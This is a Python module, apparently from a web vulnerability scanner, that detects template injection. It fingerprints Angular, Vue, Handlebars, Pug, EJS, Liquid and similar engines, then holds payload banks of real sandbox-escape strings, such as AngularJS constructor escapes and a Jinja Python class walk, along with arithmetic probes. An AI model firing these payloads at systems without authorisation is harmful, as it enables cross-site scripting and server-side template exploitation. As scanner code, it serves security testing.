"""
_template_injection.py
======================
Client-side template injection detection.

Background
----------
Modern SPAs (Angular, Vue, AngularJS, Mustache, Handlebars) interpolate
data via template syntax that gets evaluated by the framework BEFORE
rendering to DOM. If user input lands inside a template expression and
isn't properly escaped, the framework will EVALUATE the expression as
JavaScript — bypassing every traditional XSS sanitizer because the
payload doesn't contain any HTML.

Examples that traditional scanners miss
---------------------------------------

    <h1>Hello {{user.name}}</h1>
    URL: ?user.name={{constructor.constructor('alert(1)')()}}
    → AngularJS evaluates expression, alert(1) fires
    → No <script>, no on*=, no javascript: scheme
    → Every regex-based scanner reports "no XSS"

    <h1 v-html="message"></h1>
    URL: ?message={{$el.ownerDocument.defaultView.alert(1)}}
    → Vue evaluates, alert(1) fires

    <h1>{{title}}</h1>           // Handlebars
    URL: ?title={{#with "constructor"}}{{#with split as |a|}}{{this.alert "1"}}{{/with}}{{/with}}

The only way to detect this:
  1. Detect framework via response body sniffing
  2. Send framework-specific sandbox-escape payloads
  3. Confirm execution either via static analysis (template syntax in
     reflection) or dynamic verification (Playwright)

Public API
----------

    detect_framework(body, headers) -> FrameworkInfo
        Identify which template engine the response uses.

    payload_bank(framework) -> List[TemplatePayload]
        Get framework-specific payload bank (sandbox escape primitives).

    classify_template_reflection(body, marker, payload) -> Optional[TemplateVerdict]
        Did the marker land inside a template expression that would
        eval our payload?
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from enum import Enum
from typing import List, Optional, Set


class Framework(str, Enum):
    ANGULAR_NEW   = "angular"          # Angular 2+
    ANGULAR_JS    = "angularjs"        # Angular 1.x — most exploitable
    VUE           = "vue"
    REACT         = "react"            # React generally not template-injectable but some patterns
    SVELTE        = "svelte"
    HANDLEBARS    = "handlebars"
    MUSTACHE      = "mustache"
    JINJA_LIKE    = "jinja"            # {{ }} style server-side leak (Jinja2/Django)
    # v10.14: rozšířené pokrytí běžných JS template enginů ze stejné rodiny
    # (vše má klientskou detekční signaturu — knihovna v <script src=> nebo
    # charakteristická syntax v body).
    PUG           = "pug"              # Pug (dříve Jade) — Node.js templating
    EJS           = "ejs"              # EJS — <% %> syntaxe, populární v Express
    LIQUID        = "liquid"           # Liquid — Shopify, Jekyll
    UNKNOWN       = "unknown"


@dataclass
class FrameworkInfo:
    framework:  Framework = Framework.UNKNOWN
    version:    str = ""
    confidence: float = 0.0
    evidence:   List[str] = field(default_factory=list)
    # Multiple frameworks can coexist (e.g. WordPress site with Vue widget)
    additional: List[Framework] = field(default_factory=list)


@dataclass
class TemplatePayload:
    """A framework-specific sandbox-escape payload."""
    framework: Framework
    payload:   str
    sentinel:  str               # what to look for in response/DOM as proof
    name:      str = ""          # human-readable label
    notes:     str = ""


@dataclass
class TemplateVerdict:
    """Verdict on whether reflection landed in a template-evaluable spot."""
    template_evaluable:  bool
    framework:           Framework
    expression_context:  str = ""    # "interpolation" / "directive" / "v-html" / etc.
    confidence:          float = 0.0
    rationale:           str = ""


# ══════════════════════════════════════════════════════════════════════════════
# FRAMEWORK DETECTION
# ══════════════════════════════════════════════════════════════════════════════

# Patterns ordered: most specific → most generic. First match wins per ramp.
_FW_PATTERNS = [
    # Angular 2+ — ng-version, [ngClass], (click), *ngIf, etc.
    (Framework.ANGULAR_NEW, [
        (re.compile(r'<[^>]+\sng-version\s*=\s*["\']([^"\']+)', re.I), "ng-version attribute", 0.95),
        (re.compile(r'\sng-app\s*=\s*["\'][^"\']*["\']', re.I), "ng-app marker", 0.7),
        (re.compile(r'\s\*(?:ngIf|ngFor|ngSwitch)\b', re.I), "Angular structural directive", 0.85),
        (re.compile(r'\[(?:ngClass|ngStyle|innerHTML)\]', re.I), "Angular property binding", 0.85),
        (re.compile(r'\bplatformBrowserDynamic\b'), "Angular bootstrap", 0.9),
    ]),
    # AngularJS 1.x — DEEPLY exploitable, deprecated but still everywhere
    (Framework.ANGULAR_JS, [
        (re.compile(r'\sng-controller\s*=', re.I), "ng-controller", 0.85),
        (re.compile(r'\sng-(?:click|model|repeat|init|bind|show|hide|if)\b', re.I), "AngularJS directive", 0.9),
        (re.compile(r'\bangular\.(?:module|bootstrap)\b'), "AngularJS API call", 0.95),
        (re.compile(r'angular(?:\.min)?\.js[\?\#"\']', re.I), "AngularJS script tag", 0.9),
    ]),
    # Vue.js
    (Framework.VUE, [
        (re.compile(r'\bnew\s+Vue\s*\('), "new Vue() instantiation", 0.95),
        (re.compile(r'\sv-(?:if|for|model|bind|on|html|text|show)\b', re.I), "Vue directive", 0.9),
        (re.compile(r'\s:[a-zA-Z][a-zA-Z0-9-]+\s*=\s*["\']'), "Vue shorthand binding", 0.6),
        (re.compile(r'\@(?:click|input|submit|change)\s*=\s*["\']'), "Vue event shorthand", 0.7),
        (re.compile(r'vue(?:\.min|\.runtime)?\.js[\?\#"\']', re.I), "Vue script tag", 0.85),
    ]),
    # React — usually JSX compiled, less injectable but detect for completeness
    (Framework.REACT, [
        (re.compile(r'react(?:-dom)?(?:\.production|\.development|\.min)?\.js[\?\#"\']', re.I), "React script", 0.85),
        (re.compile(r'\bdata-reactroot\b'), "React root marker", 0.9),
        (re.compile(r'\b__REACT_DEVTOOLS_GLOBAL_HOOK__\b'), "React devtools hook", 0.95),
    ]),
    (Framework.SVELTE, [
        (re.compile(r'svelte-[a-z0-9]{6,}'), "Svelte CSS scope class", 0.85),
    ]),
    # Handlebars / Mustache (often used in CMS, email templates)
    (Framework.HANDLEBARS, [
        (re.compile(r'handlebars(?:\.runtime)?(?:\.min)?\.js[\?\#"\']', re.I), "Handlebars script", 0.9),
        (re.compile(r'\{\{#(?:if|each|with|unless)\s'), "Handlebars block helper", 0.75),
    ]),
    (Framework.MUSTACHE, [
        (re.compile(r'mustache(?:\.min)?\.js[\?\#"\']', re.I), "Mustache script", 0.9),
    ]),
    # v10.14: další běžné JS template enginy. Confidence ze script-src je
    # vysoká (jednoznačná identifikace), ze syntax (<% %>, {%- %}, {{x}})
    # je nižší — tyhle značky jsou sdílené napříč ERB/PHP/ASP/Jinja, takže
    # samotná syntax nestačí na rozhodnutí o frameworku.
    (Framework.PUG, [
        (re.compile(r'pug(?:\.runtime)?(?:\.min)?\.js[\?\#"\']', re.I), "Pug script", 0.9),
        # Jade (starší název Pugu)
        (re.compile(r'jade(?:\.runtime)?(?:\.min)?\.js[\?\#"\']', re.I), "Jade (legacy Pug) script", 0.9),
    ]),
    (Framework.EJS, [
        (re.compile(r'ejs(?:\.min)?\.js[\?\#"\']', re.I), "EJS script", 0.9),
        # <%- %> ve výpisu — vyžadujeme bezprostředně uzavírací %>
        # a žádný HTML komentář v rozsahu (negative lookbehind by byl
        # variable-length → fixed: vyžadujeme aspoň jednoznačný EJS
        # output tag s uzavřením a non-trivial content).
        # Pattern musí být na samostatném místě v body, ne v <!--...-->.
        # Konzervativní: požadujeme alespoň dva výskyty pro snížení FP.
        (re.compile(r'<%-\s*[a-zA-Z_][\w.]*\s*%>.*?<%[-=]?\s*\w', re.S),
         "EJS unescaped output tags (>=2)", 0.55),
    ]),
    (Framework.LIQUID, [
        (re.compile(r'liquid(?:\.min)?\.js[\?\#"\']', re.I), "Liquid script", 0.9),
        # Liquid-specific: {%- assign -%}, {%- if -%}
        (re.compile(r'\{%-?\s*(?:assign|capture|case|when|unless|tablerow|paginate)\s'),
         "Liquid block tag", 0.7),
    ]),
]


def detect_framework(body: str, headers=None) -> FrameworkInfo:
    """Sniff response body (and optionally headers) to identify template engine.

    Returns FrameworkInfo with .framework=UNKNOWN if nothing clearly matches.
    """
    if not body:
        return FrameworkInfo()

    matches: List[tuple] = []   # (framework, score, evidence_str, version)
    for fw, patterns in _FW_PATTERNS:
        score = 0.0
        ev_pieces = []
        version = ""
        for rx, label, weight in patterns:
            m = rx.search(body)
            if m:
                ev_pieces.append(label)
                score = max(score, weight)
                # Pull version from ng-version match
                if fw == Framework.ANGULAR_NEW and m.groups():
                    version = m.group(1)
        if score > 0:
            matches.append((fw, score, ", ".join(ev_pieces), version))

    if not matches:
        return FrameworkInfo()

    # Sort by confidence
    matches.sort(key=lambda x: -x[1])
    primary = matches[0]
    info = FrameworkInfo(
        framework=primary[0],
        version=primary[3],
        confidence=primary[1],
        evidence=[primary[2]],
        additional=[m[0] for m in matches[1:] if m[1] >= 0.7],
    )
    return info


# ══════════════════════════════════════════════════════════════════════════════
# PAYLOAD BANKS
# ══════════════════════════════════════════════════════════════════════════════

# AngularJS 1.x sandbox bypasses by version range. The sandbox was removed
# in 1.6 (any expression evals freely), but earlier versions had escapes
# specific to each version. We send a "shotgun" of historical bypasses.
_ANGULARJS_PAYLOADS = [
    # Universal "constructor of constructor" — works on most Angular sandboxes
    "{{constructor.constructor('alert(1)')()}}",
    "{{$on.constructor('alert(1)')()}}",
    # 1.6+ sandbox-removed (just naked expression)
    "{{$eval('alert(1)')}}",
    # 1.5.x bypass via toString
    "{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}",
    # 1.4.x bypass
    "{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,alert(1),a')}}",
    # 1.3.x classic — toString().constructor
    "{{toString().constructor.prototype.charAt=[].join;[1]|orderBy:'toString().constructor.fromCharCode(120)'}}",
    # Generic — works in most contexts where expressions get parsed
    "{{['alert(1)']|map:this.constructor.constructor}}",
]

# v10.16: AngularJS bypassy s rozsahem verzí, pro které jsou relevantní.
# (min_inclusive, max_exclusive, payload). None = bez hranice. Umožňuje
# version-aware výběr — místo "shotgun" všech historických bypassů pošli
# jen ty, co dávají smysl pro detekovanou verzi (méně requestů, méně šumu).
_ANGULARJS_PAYLOADS_VERSIONED = [
    (None,    None,    "{{constructor.constructor('alert(1)')()}}"),   # univerzální
    (None,    None,    "{{$on.constructor('alert(1)')()}}"),          # univerzální
    ("1.6.0", None,    "{{$eval('alert(1)')}}"),                       # 1.6+ (sandbox zrušen)
    ("1.5.0", "1.6.0", "{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}"),
    ("1.4.0", "1.5.0", "{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,alert(1),a')}}"),
    ("1.3.0", "1.4.0", "{{toString().constructor.prototype.charAt=[].join;[1]|orderBy:'toString().constructor.fromCharCode(120)'}}"),
    (None,    None,    "{{['alert(1)']|map:this.constructor.constructor}}"),  # generický
]

# Angular 2+ — much harder, runs in compiled mode usually. But still
# possible in template strings injected at runtime via TemplateRef etc.
_ANGULAR_NEW_PAYLOADS = [
    # Template expression context (rare runtime)
    "{{constructor.constructor('alert(1)')()}}",
    # Property binding tampering
    "[innerHTML]='\"<img src=x onerror=alert(1)>\"'",
]

_VUE_PAYLOADS = [
    # Vue 2.x — _Vue uses Function() under the hood; sandbox escapes via prototype
    "{{constructor.constructor('alert(1)')()}}",
    "{{_c.constructor('alert(1)')()}}",
    # Vue 2 specific
    "{{$el.ownerDocument.defaultView.alert(1)}}",
    "{{this.constructor.constructor('alert(1)')()}}",
    # Vue 3 — proxy-based reactivity
    "{{_Vue.h('script',null,'alert(1)')}}",
    # v-html injection
    "{{['alert(1)']|map:eval}}",
    # Direct directive injection (when reflection is in attribute)
    "\" v-html=\"'<svg onload=alert(1)>'\"",
    "\" :innerHTML=\"'<img src=x onerror=alert(1)>'\"",
]

_HANDLEBARS_PAYLOADS = [
    # Server-side Handlebars (Node.js): {{#with}} sandbox escape
    "{{#with \"constructor\"}}{{#with split as |a|}}{{this.alert \"1\"}}{{/with}}{{/with}}",
    # Triple-stash → unescaped HTML output
    "{{{<script>alert(1)</script>}}}",
    # Helper invocation if attacker controls helper
    "{{{constructor.constructor 'alert(1)'}}}",
]

_MUSTACHE_PAYLOADS = [
    # Mustache is logic-less, exploit is via {{{ }}} unescaped output
    "{{{<svg onload=alert(1)>}}}",
]

_JINJA_LIKE_PAYLOADS = [
    # Server-side Jinja2/Django/Flask leak — extremely high-impact (RCE)
    # if reflected, but here treated as XSS scope only
    "{{config}}",
    "{{7*7}}",                                          # 49 → server-side eval
    "{{request}}",
    "{{''.__class__.__mro__[1].__subclasses__()}}",   # Python class walk
]

# v10.14: payload banks pro nově přidané enginy (Pug/EJS/Liquid).
# Konvence stejná jako existující banks — stringy, payload_bank() je
# přebalí na TemplatePayload se sentinelem (alert(1) nebo aritmetika).
# Severity zacházení dělá pipeline → context-aware probe, ne sám bank.

_PUG_PAYLOADS = [
    # Pug používá #{...} pro interpolaci a !{...} pro unsafe HTML.
    # Sandbox escape přes JS Function constructor — funguje když je
    # template kompilovaný s 'compileDebug' nebo když attacker řídí
    # template string (server-side Pug.compile s user inputem).
    #
    # v10.14 fix: payload SENTINEL musí být detekovatelný v body i PO
    # vyhodnocení Pug výrazu. Aritmetika (#{7*7} → 49) je nejednoznačná
    # (49 se objevuje v body náhodně). Místo toho string concat —
    # výsledek je unikátní substring "XSSPROBE", který v body normálně
    # není a po Pug evalu se tam objeví.
    "#{'XSSPROBE'+'XSGS'}",                              # eval → XSSPROBEXSGS
    "#{'X'+'S'+'S'+'P'+'R'+'O'+'B'+'E'}",                # eval → XSSPROBE
    "!{'<xgmarker>'}",                                    # unsafe HTML → <xgmarker>
    # Sandbox escape (Function constructor) — pro server-side Pug
    "#{constructor.constructor('return \\'XSSPROBE\\'')()}",
]

_EJS_PAYLOADS = [
    # EJS: <%= %> = escaped output, <%- %> = raw output, <% %> = scriptlet.
    # SSTI v EJS dává RCE přes Function/require — typický server-side
    # tag-based engine. Zde sledujeme reflexi jako XSS scope.
    # v10.14: sentinel XSSPROBE po eval (ne 49 aritmetika — false-positive).
    "<%= 'XSSPROBE'+'XSGS' %>",                            # eval → XSSPROBEXSGS
    "<%- 'XSS'+'PROBE'+'XG' %>",                           # raw eval → XSSPROBEXG
    "<%= (function(){return 'XSSPROBE_EJS';})() %>",        # IIFE eval
    "<%= process.version %>",                              # leak Node.js verze (server-side)
]

_LIQUID_PAYLOADS = [
    # Liquid (Shopify/Jekyll) je výrazně sandbox-aware, ale {% raw %},
    # custom filters a starší verze mají bypass cesty.
    # v10.14: sentinel XSSPROBE po eval, ne aritmetika.
    "{{ 'XSSPROBE' | append: '_LIQ' }}",                   # filter eval → XSSPROBE_LIQ
    "{%- assign x = 'XSSPROBE' -%}{{ x }}",                # assign+render → XSSPROBE
    "{{ 'X' | append: 'SSPROBE' }}",                       # concat eval → XSSPROBE
    # Raw block bypass — pokud server nesanitizuje uvnitř raw
    "{% raw %}<xgmarker>{% endraw %}",
]

_PAYLOAD_BANKS = {
    Framework.ANGULAR_JS:  _ANGULARJS_PAYLOADS,
    Framework.ANGULAR_NEW: _ANGULAR_NEW_PAYLOADS,
    Framework.VUE:         _VUE_PAYLOADS,
    Framework.HANDLEBARS:  _HANDLEBARS_PAYLOADS,
    Framework.MUSTACHE:    _MUSTACHE_PAYLOADS,
    Framework.JINJA_LIKE:  _JINJA_LIKE_PAYLOADS,
    # v10.14: Pug/EJS/Liquid teď mají payload banks, takže pipeline
    # (xss_grenade.py ~ř.8517) může poslat probe a finding se dostane
    # přes _template_finding do GUI jako TI:<framework> hit.
    Framework.PUG:         _PUG_PAYLOADS,
    Framework.EJS:         _EJS_PAYLOADS,
    Framework.LIQUID:      _LIQUID_PAYLOADS,
    # React, Svelte: no general template injection vector — return empty
    Framework.REACT:       [],
    Framework.SVELTE:      [],
}


def payload_bank(framework: Framework) -> List[TemplatePayload]:
    """Return framework-specific payloads. Empty list = no known vector."""
    raw = _PAYLOAD_BANKS.get(framework, [])
    out = []
    for p in raw:
        # Sentinel: extract a short canary from each payload that, if
        # reflected raw OR evaluated, indicates server-side processing.
        # For "alert(1)" payloads, the sentinel is "alert(1)" itself —
        # if it appears verbatim in response, the template was rendered
        # but expression wasn't evaluated (string treated as literal text).
        # The real exploit verification needs Playwright (dialog fired).
        #
        # v10.14: Pug/EJS/Liquid payloads use string concatenation that
        # EVALUATES to a unique marker ("XSSPROBE"). If the marker appears
        # in body, server evaluated the template expression (positive
        # signal). If only the raw payload string appears, server just
        # reflected the URL verbatim (negative — no template eval).
        # Special markers we use in our concat payloads:
        if "XSSPROBE" in p:
            # Evaluated output should contain "XSSPROBE" (the string
            # parts concatenate to it). If raw payload echoes back,
            # _is_inside_expression() in classify_template_reflection
            # is what detects template context — same as alert(1) case.
            sentinel = "XSSPROBE"
        elif "<xgmarker>" in p:
            # !{...} / {% raw %} blocks render the marker verbatim
            sentinel = "<xgmarker>"
        elif "alert(1)" in p:
            sentinel = "alert(1)"
        else:
            sentinel = p[:32]
        out.append(TemplatePayload(
            framework=framework, payload=p, sentinel=sentinel,
            name=f"{framework.value}_sandbox_escape",
        ))
    return out


def _ver_tuple(v):
    """'1.5.9' → (1,5,9); None/unparseable → None."""
    if not v:
        return None
    try:
        parts = v.split("-")[0].split("+")[0].strip().split(".")
        nums = [int(x) for x in parts[:3]]
        while len(nums) < 3:
            nums.append(0)
        return tuple(nums)
    except (ValueError, AttributeError):
        return None


def payload_bank_for_version(framework: Framework,
                             version: str = "") -> List[TemplatePayload]:
    """v10.16: Version-aware výběr payloadů. Pro AngularJS 1.x: pokud známe
    verzi, pošli jen univerzální bypassy + ten odpovídající version range
    (méně requestů, méně šumu) místo celé "shotgun" historie. Pro ostatní
    frameworky (zatím bez version-range dat) deleguje na payload_bank().

    Když verze není známá nebo neparsovatelná, vrátí plný bank (bezpečný
    fallback — radši pošli víc, než minout zranitelnost).
    """
    if framework != Framework.ANGULAR_JS:
        return payload_bank(framework)

    vt = _ver_tuple(version)
    if vt is None:
        # Verze neznámá → plný shotgun (původní chování)
        return payload_bank(framework)

    selected = []
    for min_v, max_v, payload in _ANGULARJS_PAYLOADS_VERSIONED:
        min_t = _ver_tuple(min_v)
        max_t = _ver_tuple(max_v)
        if min_t is not None and vt < min_t:
            continue
        if max_t is not None and vt >= max_t:
            continue
        selected.append(payload)

    out = []
    for p in selected:
        sentinel = "alert(1)" if "alert(1)" in p else p[:32]
        out.append(TemplatePayload(
            framework=framework, payload=p, sentinel=sentinel,
            name=f"{framework.value}_sandbox_escape_v{version}",
        ))
    return out


# Universal fallback bank — try when framework is UNKNOWN. Catches generic
# Mustache-like syntax that many smaller libs use.
def universal_payloads() -> List[TemplatePayload]:
    universals = [
        "{{7*7}}",                                              # arithmetic = template eval
        "{{constructor.constructor('alert(1)')()}}",
        "{{$on.constructor('alert(1)')()}}",
        "${alert(1)}",                                          # JS template literal
        "<%= 7*7 %>",                                           # ERB / EJS
        "[[7*7]]",                                              # Some less common engines
    ]
    return [TemplatePayload(
        framework=Framework.UNKNOWN, payload=p,
        sentinel="49" if "7*7" in p else "alert(1)",
        name="universal_template_probe",
    ) for p in universals]


# ══════════════════════════════════════════════════════════════════════════════
# ARITHMETIC DETECTION PROBE (v10.16)
# ══════════════════════════════════════════════════════════════════════════════
# Gold-standard CSTI detekce: pošli neškodný aritmetický výraz a podívej se,
# jestli ho engine VYHODNOTÍ. Když ve výstupu místo literálu `{{a*b}}` najdeš
# součin, je to deterministický důkaz, že template engine interpoluje a
# vyhodnocuje vstup → potvrzený injection bod. Teprve PAK má smysl zkoušet
# sandbox-escape exploit payloady.
#
# Operandy jsou NÁHODNÉ (ne 7*7), aby se výsledek náhodou už nevyskytoval na
# stránce (verze, ceny, počítadla…) → drasticky nižší false-positive.

# Syntaktické varianty interpolace napříč engine rodinami.
# {{ }}  = Angular/Vue/AngularJS/Mustache/Handlebars/Jinja/Twig
# ${ }   = JS template literal / Thymeleaf / některé další
# <%= %> = ERB / EJS
# #{ }   = Ruby-ish / Pug
# *{ }   = méně časté
_ARITH_WRAPPERS = ["{{%s}}", "${%s}", "<%%= %s %%>", "#{%s}", "[[%s]]"]


def build_arithmetic_probes(seed: int = 0) -> List["TemplatePayload"]:
    """Vrátí sadu aritmetických detekčních probů s NÁHODNÝMI operandy.

    Každý prob nese unikátní očekávaný součin jako sentinel. Detekce je pak:
    `sentinel in response AND literal_expression NOT in response`.
    """
    import random as _r
    rng = _r.Random(seed or _r.randint(1000, 9_999_999))
    probes: List[TemplatePayload] = []
    # 2-3 různé dvojice operandů → různé součiny (robustní proti náhodné shodě)
    pairs = set()
    while len(pairs) < 3:
        a = rng.randint(31, 97)
        b = rng.randint(31, 97)
        # vyhni se triviálním/snadno-kolidujícím součinům
        if a * b > 1000 and a != b:
            pairs.add((a, b))
    for a, b in pairs:
        product = a * b
        expr = f"{a}*{b}"
        for wrapper in _ARITH_WRAPPERS:
            payload = wrapper % expr
            probes.append(TemplatePayload(
                framework=Framework.UNKNOWN,
                payload=payload,
                sentinel=str(product),       # co hledáme = vyhodnocený součin
                name="arithmetic_probe",
                notes=expr,                  # literál, který NESMÍ zůstat ve výstupu
            ))
    return probes


def check_arithmetic_eval(body: str, probe: "TemplatePayload") -> bool:
    """True pokud `body` obsahuje vyhodnocený součin (sentinel), ale NE syntax
    literál (notes) — tj. engine výraz reálně vyhodnotil, neodrazil ho jako text.

    Vrací False při jakékoli pochybnosti (sentinel chybí, nebo je tam pořád
    literál → jen reflexe, ne eval).
    """
    if not body or not probe.sentinel:
        return False
    # Vyhodnocený součin musí být přítomen jako SAMOSTATNÉ číslo (digit-boundary),
    # ne jako podřetězec většího čísla — jinak náhodná čísla na stránce (ceny, ID,
    # timestamps) obsahující tyto číslice dají false-positive i když se vstup vůbec
    # neodrazil. Substring `in` tuhle koincidenci nerozliší.
    if not re.search(r"(?<!\d)" + re.escape(probe.sentinel) + r"(?!\d)", body):
        return False
    # …a původní výraz (např. "53*61") NESMÍ zůstat (jinak je to jen reflexe).
    if probe.notes and probe.notes in body:
        return False
    return True


# ══════════════════════════════════════════════════════════════════════════════
# REFLECTION CLASSIFICATION — did marker land in template-evaluable spot?
# ══════════════════════════════════════════════════════════════════════════════

# Match {{ ... MARKER ... }} or v-html="MARKER" or [innerHTML]="MARKER"
def _is_inside_expression(body: str, marker_offset: int) -> tuple:
    """Check if marker_offset is INSIDE a {{ }} expression in body.

    Returns (is_inside, context_label). context_label is one of:
        "interpolation"  — {{ MARKER }}
        "v-html"         — v-html="MARKER"
        "innerHTML"      — [innerHTML]="MARKER"
        "ng-bind"        — ng-bind="MARKER"
        "directive"      — generic directive value
        ""               — not in template context
    """
    if marker_offset < 0 or marker_offset >= len(body):
        return False, ""

    # Look backwards for {{ within ~200 chars
    window_back = body[max(0, marker_offset - 200):marker_offset]
    window_fwd = body[marker_offset:min(len(body), marker_offset + 200)]

    # {{ ... }} interpolation
    if "{{" in window_back:
        last_open = window_back.rfind("{{")
        # Check if there's a closing }} BEFORE marker (means we're outside)
        close_in_back = window_back.find("}}", last_open + 2)
        if close_in_back == -1:
            # Open expression — check if there's a closing forward
            if "}}" in window_fwd:
                return True, "interpolation"

    # v-html="MARKER" / :innerHTML="MARKER"
    pre = body[max(0, marker_offset - 60):marker_offset]
    if re.search(r'\bv-html\s*=\s*["\'][^"\']*$', pre):
        return True, "v-html"
    if re.search(r'\[innerHTML\]\s*=\s*["\'][^"\']*$', pre):
        return True, "innerHTML"
    if re.search(r'\sng-bind(?:-html)?\s*=\s*["\'][^"\']*$', pre):
        return True, "ng-bind"
    if re.search(r'\sv-(?:bind|model|on)\s*=\s*["\'][^"\']*$', pre):
        return True, "directive"
    if re.search(r'\s:[a-zA-Z][a-zA-Z0-9-]*\s*=\s*["\'][^"\']*$', pre):
        return True, "directive"

    return False, ""


def _is_server_side_template_eval(body: str,
                                    sentinel: str,
                                    payload: str,
                                    framework: Framework) -> bool:
    """v10.14: Detekce server-side template eval pro Pug/EJS/Liquid.

    Existující _is_inside_expression() předpokládá CLIENT-SIDE rendering —
    template syntax zůstává v body (Handlebars, Vue, Angular). To je pro
    SERVER-SIDE enginy (Pug, EJS, Liquid, ERB) špatný předpoklad: server
    vyhodnotí výraz a do body pošle jen VÝSLEDEK, žádná syntax.

    Tato funkce detekuje server-side eval podle 2 kritérií:
      1. Sentinel (např. "XSSPROBE") JE v body — payload byl renderován
      2. Raw payload string NENÍ v body — server ho ne-reflektoval doslova
         → server VYHODNOTIL výraz

    Pokud sentinel je v body a payload tam taky JE, server payload jen
    odrazil bez evaluace — to není template injection, jen reflexe.

    Vrací True jen pro frameworky, které vyhodnocují server-side
    (PUG, EJS, LIQUID). Pro client-side frameworky vrací False
    a klasifikátor pokračuje původní cestou.
    """
    # Aktivuje se POUZE pro server-side enginy
    if framework not in (Framework.PUG, Framework.EJS, Framework.LIQUID):
        return False
    if not sentinel or not payload:
        return False

    sentinel_in_body = sentinel in body
    payload_in_body  = payload in body

    # Pravý server-side eval: výsledek tam je, payload doslovně NE
    return sentinel_in_body and not payload_in_body


def classify_template_reflection(body: str,
                                   marker: str,
                                   payload: str = "") -> Optional[TemplateVerdict]:
    """Determine if `marker` landed in a template-evaluable spot, given
    framework detection from `body`.

    Returns TemplateVerdict with template_evaluable=True if the marker
    is between {{ }} or inside a directive value where the framework
    will treat the contents as an expression.
    """
    if not body or not marker:
        return None

    # v10.14: Server-side eval detection — pro Pug/EJS/Liquid se
    # syntax v body neobjeví. Tato cesta běží PŘED _is_inside_expression
    # a aktivuje se POUZE pro server-side enginy, takže klasifikace
    # existujících client-side frameworků (Vue/Angular/Handlebars)
    # zůstává beze změny.
    fw_info = detect_framework(body)
    if _is_server_side_template_eval(body, marker, payload, fw_info.framework):
        return TemplateVerdict(
            template_evaluable=True,
            framework=fw_info.framework,
            expression_context="server_side_eval",
            confidence=0.85,
            rationale=(f"server-side {fw_info.framework.value} engine "
                       f"detected; sentinel '{marker}' appears in response "
                       f"body but raw payload does NOT — template "
                       f"expression was evaluated, not reflected verbatim"),
        )

    # Locate marker
    off = body.find(marker)
    if off == -1:
        return None

    is_in, ctx = _is_inside_expression(body, off)
    if not is_in:
        # Even if marker landed in plain HTML, payload might still be
        # interpreted if it CONTAINS template syntax. That's a different
        # vector — server received {{...}} as URL param and reflected raw.
        # Worth flagging as low-confidence finding.
        if payload and ("{{" in payload or "v-html" in payload):
            fw_info_inner = detect_framework(body)
            if fw_info_inner.framework != Framework.UNKNOWN:
                return TemplateVerdict(
                    template_evaluable=True,
                    framework=fw_info_inner.framework,
                    expression_context="injected_via_payload",
                    confidence=0.5,
                    rationale=("payload contains template syntax AND framework "
                               f"detected ({fw_info_inner.framework.value}); "
                               "marker reflected in HTML body — "
                               "framework will compile expression at render time"),
                )
        return TemplateVerdict(
            template_evaluable=False,
            framework=Framework.UNKNOWN,
            confidence=0.9,
            rationale="marker_not_in_template_expression",
        )

    fw_info = detect_framework(body)
    return TemplateVerdict(
        template_evaluable=True,
        framework=fw_info.framework,
        expression_context=ctx,
        confidence=0.9,
        rationale=f"marker_inside_{ctx}_expression on {fw_info.framework.value}",
    )
